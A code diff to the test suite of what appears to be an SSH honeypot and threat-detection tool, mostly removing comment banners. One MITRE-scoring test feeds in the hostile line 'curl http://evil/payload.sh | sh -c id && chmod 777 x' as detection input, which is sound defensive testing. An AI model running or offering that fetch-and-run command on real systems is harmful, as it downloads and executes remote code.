@@ -35,9 +35,7 @@ from cloudsentinel.webhook import WebhookConfig, WebhookNotifier
 from fastapi.testclient import TestClient
 from pydantic import SecretStr
 
-# ═══════════════════════════════════════════════════════════════════
 # Config Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_config_loads_usas_profile() -> None:
     settings = load_settings(
@@ -275,9 +273,7 @@ def test_admin_api_exposure_digitalocean_provider(monkeypatch: pytest.MonkeyPatc
     assert data["paused"] is True
 
 
-# ═══════════════════════════════════════════════════════════════════
 # Event Codec Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_event_codec_round_trip() -> None:
     payload = {"event_type": "shell.command", "payload": {"command": "id"}}
@@ -293,9 +289,7 @@ def test_event_codec_nested_objects() -> None:
     assert loads_text(dumps_text(payload)) == payload
 
 
-# ═══════════════════════════════════════════════════════════════════
 # HASSH Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_hassh_exact_format() -> None:
     hassh, algorithms = calculate_hassh(
@@ -366,9 +360,7 @@ def test_infer_client_software_from_version() -> None:
     assert infer_client_software("SSH-2.0-Go") == "Go crypto/ssh"
 
 
-# ═══════════════════════════════════════════════════════════════════
 # MITRE Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_mitre_scores_attack_command() -> None:
     annotation = score_command("curl http://evil/payload.sh | sh -c id && chmod 777 x")
@@ -419,9 +411,7 @@ def test_mitre_has_phase1_coverage_target() -> None:
     assert len(MITRE_TECHNIQUES) >= 15
 
 
-# ═══════════════════════════════════════════════════════════════════
 # GeoIP Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_geoip_public_ip_detection() -> None:
     assert is_public_ip("8.8.8.8") is True
@@ -431,9 +421,7 @@ def test_geoip_public_ip_detection() -> None:
     assert is_public_ip("172.16.0.1") is False
 
 
-# ═══════════════════════════════════════════════════════════════════
 # SOAR Tests
-# ═══════════════════════════════════════════════════════════════════
 
 @pytest.mark.asyncio
 async def test_soar_scores_failed_login() -> None:
@@ -521,7 +509,7 @@ async def test_soar_attack_chain_correlation() -> None:
     e1 = {"eventid": "cloudsentinel.login.failed", "session": "c1",
           "src_ip": "5.6.7.8", "country_code": "RU"}
     await soar.process_event("c1", e1)
-    # Session 2 from same IP — should get chain bonus
+    # Session 2 from same IP: should get chain bonus
     e2 = {"eventid": "cloudsentinel.login.failed", "session": "c2",
           "src_ip": "5.6.7.8", "country_code": "RU"}
     result = await soar.process_event("c2", e2)
@@ -666,9 +654,7 @@ async def test_stream_redacts_password_from_public_events() -> None:
     assert "password" not in stream._buffer[0]
 
 
-# ═══════════════════════════════════════════════════════════════════
 # VFS Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_vfs_builds_default() -> None:
     vfs = VirtualFileSystem.build_default()
@@ -713,9 +699,7 @@ def test_vfs_proc_stubs() -> None:
     assert "MemTotal" in meminfo
 
 
-# ═══════════════════════════════════════════════════════════════════
 # Command Adapter Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_command_adapter_defaults() -> None:
     adapter = CommandAdapter()
@@ -765,9 +749,7 @@ def test_command_uname_via_adapter() -> None:
     assert "Linux" in output
 
 
-# ═══════════════════════════════════════════════════════════════════
 # VFS Agent Tests
-# ═══════════════════════════════════════════════════════════════════
 
 @pytest.mark.asyncio
 async def test_vfs_mock_tracks_cwd_and_reads_decoys() -> None:
@@ -847,9 +829,7 @@ async def test_vfs_response_policy_templates_medium_commands() -> None:
         await agent.close()
 
 
-# ═══════════════════════════════════════════════════════════════════
 # Webhook Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_webhook_config_defaults() -> None:
     config = WebhookConfig()
@@ -885,9 +865,7 @@ def test_webhook_format_payload() -> None:
     assert "T1105" in payload["techniques"]
 
 
-# ═══════════════════════════════════════════════════════════════════
 # Pipeline Tests
-# ═══════════════════════════════════════════════════════════════════
 
 @pytest.mark.asyncio
 async def test_pipeline_buffers_when_redis_unavailable() -> None:
@@ -1101,9 +1079,7 @@ def test_docker_compose_includes_clickhouse_and_private_infra() -> None:
     assert "read_only: true" in source
 
 
-# ═══════════════════════════════════════════════════════════════════
 # Metrics Tests
-# ═══════════════════════════════════════════════════════════════════
 
 def test_metrics_singleton() -> None:
     from cloudsentinel.metrics import get_metrics
